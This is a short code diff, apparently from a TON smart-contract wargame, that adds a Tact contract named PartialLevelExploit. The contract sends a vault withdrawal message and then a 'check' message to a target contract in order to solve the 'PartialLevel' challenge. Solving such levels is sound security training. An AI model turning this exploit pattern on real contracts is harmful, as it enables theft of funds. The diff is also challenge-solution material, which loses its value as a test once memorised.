@@ -108,3 +108,13 @@ contract PartialLevel with Deployable {
         return self.completed;
     }
 }
+message Exploit {
+    target: Address;
+}
+
+contract PartialLevelExploit {
+    receive(msg: Exploit){
+        send(SendParameters{to: msg.target, value: ton("0.1"), body: WithdrawFromVault{amount: 1000}.toCell()});
+        send(SendParameters{to: msg.target, value: ton("0.1"), body: "check".asComment()});
+    }
+}
